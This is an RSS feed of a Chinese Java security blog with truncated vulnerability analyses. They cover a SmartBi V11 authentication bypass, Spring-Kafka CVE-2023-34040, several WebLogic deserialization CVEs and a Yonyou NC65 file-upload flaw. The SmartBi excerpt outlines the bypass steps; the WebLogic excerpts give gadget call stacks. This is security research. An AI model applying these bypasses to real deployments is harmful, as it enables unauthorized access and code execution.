<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JavaSec on Snakinya-明烛天南</title>
    <link>https://www.snakin.top/categories/javasec/</link>
    <description>Recent content in JavaSec on Snakinya-明烛天南</description>
    <generator>Hugo</generator>
    <language>cn</language>
    <lastBuildDate>Fri, 19 Apr 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://www.snakin.top/categories/javasec/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>漏洞分析 | SmartBi V11权限绕过</title>
      <link>https://www.snakin.top/posts/smartbi%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ev11/</link>
      <pubDate>Fri, 19 Apr 2024 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/smartbi%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ev11/</guid>
      <description>&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;&#xA;&lt;p&gt;去年护网时期审出来的漏洞，最近看到学长说补丁发布了就公布出来供大家参考。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;截屏2023-08-11 14.38.21&#34; src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-08-11%2014.38.21.png&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;前台权限绕过&#34;&gt;前台权限绕过&lt;/h2&gt;&#xA;&lt;p&gt;众所周知SmartBi盛产权限绕过漏洞，最新的V11版也不例外。这次的问题还是出在&lt;code&gt;CheckIsLoggedFilter&lt;/code&gt;和&lt;code&gt;RMIServlet&lt;/code&gt;的参数获取上，先看看&lt;code&gt;CheckIsLoggedFilter&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;这是smartbi对于RMIServlet的防护，先获取 className、methodName、params，再判断上述参数是否在&lt;strong&gt;白名单&lt;/strong&gt;内&lt;/p&gt;&#xA;&lt;p&gt;那么该部分对于参数的获取分为四种：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;通过 request.getParameter 进行解析&lt;/li&gt;&#xA;&lt;li&gt;通过 windowUnloading 进行解析&lt;/li&gt;&#xA;&lt;li&gt;通过 encode 参数解析&lt;/li&gt;&#xA;&lt;li&gt;通过 request body 解析&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;四种解析依次进行，一旦解析到参数就会进行下一个阶段&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;截屏2023-08-10 23.10.19&#34; src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-08-10%2023.10.19.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;那么我们再看看&lt;code&gt;RMIServlet&lt;/code&gt;是怎么解析参数的&lt;/p&gt;&#xA;&lt;p&gt;他有两个处理，分别针对get和post请求&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;doget判断是否含有jsonpCallback参数，如果有且不为空就会调用dopost方法&lt;/li&gt;&#xA;&lt;li&gt;dopost有三种获取参数的方法&#xA;&lt;ul&gt;&#xA;&lt;li&gt;通过 request.getAttribute 解析&lt;/li&gt;&#xA;&lt;li&gt;通过文件上传的格式去解析&lt;/li&gt;&#xA;&lt;li&gt;通过 request.getParameter 解析&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;截屏2023-08-10 23.20.44&#34; src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-08-10%2023.20.44.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这两者结合很容易想到我们可以先利用getParameter和jsonpCallback来绕过第一层的检测（通过getParameter获得的参数并未setAttribute），而由于RMIServlet没有获取到属性，于是会从表单中获取参数，由此绕过。&lt;/p&gt;&#xA;&lt;p&gt;将以上带入执行流程做个简单梳理：&lt;/p&gt;&#xA;&lt;p&gt;—–Filter——&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;请求方法为GET、获取参数className(白名单)\methodName(白名单)\params([])\jsonpCallback(不为空)&lt;/li&gt;&#xA;&lt;li&gt;通过&lt;code&gt;request.getParameter&lt;/code&gt;获取参数，并没有&lt;code&gt;setAttribute&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;判断类与方法名在白名单中，Filter校验通过&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;—–Servlet——&lt;/p&gt;</description>
    </item>
    <item>
      <title>漏洞分析 | Spring-Kafka反序列化漏洞(CVE-2023-34040)分析</title>
      <link>https://www.snakin.top/posts/cve-2023-34040/</link>
      <pubDate>Sun, 24 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/cve-2023-34040/</guid>
      <description>&lt;h2 id=&#34;描述&#34;&gt;描述&lt;/h2&gt;&#xA;&lt;p&gt;Spring Kafka 是 Spring Framework 生态系统中的一个模块，用于简化在 Spring 应用程序中集成 Apache Kafka 的过程，记录(record)指 Kafka 消息中的一条记录。&lt;/p&gt;&#xA;&lt;p&gt;受影响版本中默认未对记录配置 ErrorHandlingDeserializer，当用户将容器属性 checkDeserExWhenKeyNull 或 checkDeserExWhenValueNull 设置为 true(默认为false)，并且允许不受信任的源发布到 Kafka 主题中时，攻击者可将恶意 payload 注入到 Kafka 主题中，当反序列化记录头时远程执行任意代码。&lt;/p&gt;&#xA;&lt;h2 id=&#34;受影响的-spring-产品和版本&#34;&gt;受影响的 Spring 产品和版本&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Apache Kafka 的 Spring&#xA;&lt;ul&gt;&#xA;&lt;li&gt;2.8.1至2.9.10&lt;/li&gt;&#xA;&lt;li&gt;3.0.0 至 3.0.9&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;spring-kafka模型&#34;&gt;Spring-Kafka模型&lt;/h2&gt;&#xA;&lt;p&gt;在此之前，先了解一下spring-kafka的生产者和消费者模型&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;img&#34; src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/584866-20171117093650374-1834235910.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;img&#34; src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/584866-20171122161008618-1180448375.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;img&#34; src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/584866-20171123122057196-119766742.png&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;&#xA;&lt;p&gt;根据CVE描述，我们可以知道漏洞与两个属性有关：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;截屏2023-09-04 16.49.59&#34; src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-09-04%2016.49.59.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Weblogic | CVE-2016-3510分析</title>
      <link>https://www.snakin.top/posts/cve-2016-3510bypass-cve-2015-4852/</link>
      <pubDate>Mon, 18 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/cve-2016-3510bypass-cve-2015-4852/</guid>
      <description>&lt;h2 id=&#34;引言&#34;&gt;引言&lt;/h2&gt;&#xA;&lt;p&gt;该漏洞是对CVE-2015-4852的另一种绕过方式， 使用&lt;code&gt;weblogic.corba.utils.MarshalledObject&lt;/code&gt;，其中的 &lt;code&gt;readResolve&lt;/code&gt; 会读取 objBytes 的值赋给新 new 的 ois，然后将其进行反序列化。也就是说先将恶意对象封装到&lt;code&gt;weblogic.corba.utils.MarshalledObject&lt;/code&gt;之后再对该对象进行序列化生成payload，于是在反序列化过程中可以绕过黑名单进行恶意利用。&lt;/p&gt;&#xA;&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;&#xA;&lt;p&gt;同样先在resolveClass下断点&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-08-24%2014.52.26.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以发现此时传入的是&lt;code&gt;MarshalledObject&lt;/code&gt;对象，可以绕过黑名单，接下来在&lt;code&gt;weblogic.corba.utils.MarshalledObject#readResolve&lt;/code&gt;断点&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-08-24%2014.59.55.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以发现在&lt;code&gt;readResolve&lt;/code&gt;内部new了一个&lt;code&gt;ObjectInputStream&lt;/code&gt;对象并对其进行反序列化，完成后续利用链&lt;/p&gt;&#xA;&lt;p&gt;完整的调用栈：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;transform:123, InvokerTransformer (org.apache.commons.collections.functors)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;transform:122, ChainedTransformer (org.apache.commons.collections.functors)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;get:157, LazyMap (org.apache.commons.collections.map)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;entrySet:-1, $Proxy57 (com.sun.proxy)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readObject:346, AnnotationInvocationHandler (sun.reflect.annotation)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke0:-1, NativeMethodAccessorImpl (sun.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke:57, NativeMethodAccessorImpl (sun.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke:43, DelegatingMethodAccessorImpl (sun.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke:601, Method (java.lang.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invokeReadObject:1004, ObjectStreamClass (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readSerialData:1891, ObjectInputStream (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readOrdinaryObject:1796, ObjectInputStream (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readObject0:1348, ObjectInputStream (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readObject:370, ObjectInputStream (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readResolve:58, MarshalledObject (weblogic.corba.utils)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke0:-1, NativeMethodAccessorImpl (sun.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke:57, NativeMethodAccessorImpl (sun.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke:43, DelegatingMethodAccessorImpl (sun.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invoke:601, Method (java.lang.reflect)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;invokeReadResolve:1091, ObjectStreamClass (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readOrdinaryObject:1805, ObjectInputStream (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readObject0:1348, ObjectInputStream (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readObject:370, ObjectInputStream (java.io)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readObject:69, InboundMsgAbbrev (weblogic.rjvm)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;read:41, InboundMsgAbbrev (weblogic.rjvm)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;init:215, MsgAbbrevInputStream (weblogic.rjvm)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dispatch:394, BaseAbstractMuxableSocket (weblogic.socket)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readReadySocketOnce:960, SocketMuxer (weblogic.socket)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readReadySocket:897, SocketMuxer (weblogic.socket)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;processSockets:130, PosixSocketMuxer (weblogic.socket)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;run:29, SocketReaderRequest (weblogic.socket)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;execute:42, SocketReaderRequest (weblogic.socket)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;execute:145, ExecuteThread (weblogic.kernel)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;run:117, ExecuteThread (weblogic.kernel)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pr</description>
    </item>
    <item>
      <title>Weblogic | CVE-2016-0638分析</title>
      <link>https://www.snakin.top/posts/cve-2016-0638bypass-cve-2015-4852/</link>
      <pubDate>Tue, 22 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/cve-2016-0638bypass-cve-2015-4852/</guid>
      <description>&lt;h2 id=&#34;引言&#34;&gt;引言&lt;/h2&gt;&#xA;&lt;p&gt;这个漏洞是对于CVE-2015-4852的绕过，在了解具体防御措施之前我们先学习一下Java原生类反序列化的内部调用&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20230823154132323.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;对于CVE-2015-4852漏洞，官方的做法是在&lt;code&gt;resolveClass&lt;/code&gt;处添加了黑名单，&lt;code&gt;resolveClass&lt;/code&gt;方法的作用是将类的序列化描述符加工成该类的Class对象。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-08-23%2015.53.44.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如果在&lt;code&gt;resolveClass&lt;/code&gt;中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样一来，恶意类无法生成Class，从而能够一定程度上防御反序列化攻击。&lt;/p&gt;&#xA;&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;&#xA;&lt;p&gt;首先下载补丁：https://pan.baidu.com/s/1hrGJNNI&lt;/p&gt;&#xA;&lt;p&gt;CVE-2015-4852的修复补丁为&lt;code&gt;p21984589_1036_Generic&lt;/code&gt;。这使用&lt;code&gt;p20780171_1036_Generic&lt;/code&gt;和&lt;code&gt;p22248372_1036012_Generic&lt;/code&gt;这两个补丁包，&lt;code&gt;p21984589_1036_Generic&lt;/code&gt;是前面这两个补丁包的集成。&lt;/p&gt;&#xA;&lt;p&gt;之后将补丁部署到weblogic server并重启服务，将打完补丁后到代码复制到宿主机开始分析。&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;命令集合：&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker cp p20780171_1036_Generic  weblogic1036jdk7u21:/p20780171_1036_Generic&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker cp p22248372_1036012_Generic  weblogic1036jdk7u21:/p22248372_1036012_Generic&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker &lt;span style=&#34;color:#ff5c57&#34;&gt;exec&lt;/span&gt; -it weblogic1036jdk7u21 /bin/bash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;cd&lt;/span&gt; /u01/app/oracle/middleware/utils/bsu&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir cache_dir&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vi bsu.sh   编辑MEM_ARGS参数为 -Xms512m -Xmx1024m&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp /p20780171_1036_Generic/* cache_dir/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./bsu.sh -install -patch_download_dir&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;EJUW -prod_dir&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;/u01/app/oracle/middleware/wlserver/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp /p22248372_1036012_Generic/* cache_dir/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./bsu.sh -install -patch_download_dir&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;ZLNA  -prod_dir&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;/u01/app/oracle/middleware/wlserver/ –verbose&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pr</description>
    </item>
    <item>
      <title>Weblogic | CVE-2015-4852分析</title>
      <link>https://www.snakin.top/posts/cve-2015-4852/</link>
      <pubDate>Mon, 21 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/cve-2015-4852/</guid>
      <description>&lt;h2 id=&#34;环境配置&#34;&gt;环境配置&lt;/h2&gt;&#xA;&lt;p&gt;工具：https://github.com/QAX-A-Team/WeblogicEnvironment&lt;/p&gt;&#xA;&lt;p&gt;jdk地址：https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html&lt;/p&gt;&#xA;&lt;p&gt;weblogic下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html&lt;/p&gt;&#xA;&lt;p&gt;下载并配置好依赖后，脚本一键运行，我的本机为macos m2架构&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;需要修改Dockerfile&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 基础镜像&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FROM --platform=linux/amd64 centos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 参数&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ARG JDK_PKG&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ARG WEBLOGIC_JAR&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 解决libnsl包丢失的问题&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# RUN yum -y install libnsl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/%E6%88%AA%E5%B1%8F2023-08-22%2012.38.25.png&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;t3协议&#34;&gt;T3协议&lt;/h2&gt;&#xA;&lt;p&gt;T3 协议是 Weblogic RMI 调用时的通信协议&lt;/p&gt;&#xA;&lt;p&gt;RMI 即远程方法调用，我们可以远程调用另一台 JVM虚拟机中对象上的方法，且数据传输过程中是序列化进行传输的&lt;/p&gt;&#xA;&lt;p&gt;Java RMI 的基础通信协议是 JRMP ，但是也支持开发其他的协议来优化 RMI 的传输，这里的 Weblogic 的 T3 协议就是其优化版本，相比于JRMP协议多了一些特性。以下是T3协议的特点：&lt;/p&gt;</description>
    </item>
    <item>
      <title>漏洞分析 | 用友NC65 jsinvoke 任意文件上传</title>
      <link>https://www.snakin.top/posts/yongyounc65/</link>
      <pubDate>Sat, 19 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://www.snakin.top/posts/yongyounc65/</guid>
      <description>&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;&#xA;&lt;p&gt;&lt;a href=&#34;http://static.kancloud.cn/imthx/uapdev/2651846&#34;&gt;http://static.kancloud.cn/imthx/uapdev/2651846&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;路由分析&#34;&gt;路由分析&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;webapps/nc_web/WEB-INF/web.xml&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;  &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;NCInvokerServlet&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;  &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/service/*&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;  &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;NCInvokerServlet&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;  &lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/servlet/*&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#ff6ac1&#34;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;nc.bs.framework.server.InvokerServlet的doAction&lt;/code&gt;逻辑&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#9aedfe&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#57c7ff&#34;&gt;doAction&lt;/span&gt;(HttpServletRequest request, HttpServletResponse response) &lt;span style=&#34;color:#ff5c57&#34;&gt;throws&lt;/span&gt; ServletException, IOException {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        String token &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#57c7ff&#34;&gt;getParamValue&lt;/span&gt;(request, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;security_token&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        String userCode &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span 